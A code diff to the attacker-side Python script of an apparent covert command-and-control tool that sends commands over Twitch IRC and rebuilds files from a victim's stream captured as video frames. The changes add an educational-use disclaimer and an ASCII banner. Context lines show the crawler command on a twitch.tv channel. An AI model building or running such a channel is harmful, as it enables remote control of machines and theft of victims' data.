@@ -1,4 +1,7 @@
 #!/usr/bin/env python3
+
+# Developed by Anıl Çelik (@ccelikanil) and Emre Odaman (@eodaman), usage of this tool is restricted to educational purposes only. Developers do not take any responsibility and do not accept accusation of any misuse. 
+
 import argparse
 import base64
 import hashlib
@@ -16,6 +19,23 @@ READY_TIMEOUT = 60    # seconds to wait for "READY"
 CRAWLER_SCRIPT = "crawler.py"
 DECODER_SCRIPT = "decoder.py"
 RETRY_DELAY = 1       # seconds to wait before retrying crawler
+
+banner = '''
+
+
+ ░▒▓██████▓▒░░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
+░▒▓█▓▒░      ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░ 
+░▒▓█▓▒▒▓███▓▒░▒▓█▓▒░    ░▒▓██████▓▒░   ░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░       ░▒▓██████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
+ ░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░      ░▒▓█▓▒░   ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓████████▓▒░ 
+
+		  Developed by: Anıl Çelik (@ccelikanil) and Emre Odaman (@eodaman)         
+		  		  
+		  		  for educational purposes only                                                                                              
+                                                                                                      
+'''
 
 def generate_short_id():
     """Generate an 8-character hex string (using UUID4)."""
@@ -56,8 +76,6 @@ def capture_stream(uid, channel):
     Returns the file name reconstructed by the decoder.
     """
     # Prepare an output pattern that includes the unique ID.
-    # //TODO: "%04d" means 10k frames, might have to edit for larger files. 
-  
     output_pattern = f"{uid}-%04d.png"
     channel = f"https://twitch.tv/{channel}"
     crawler_cmd = ["python", CRAWLER_SCRIPT, "--channel", channel, "--output", output_pattern]
@@ -110,6 +128,9 @@ def capture_stream(uid, channel):
         return None
 
 def main():
+
+    print(banner)
+    
     parser = argparse.ArgumentParser(
         description="Attacker: send commands over Twitch IRC and capture victim's stream"
     )
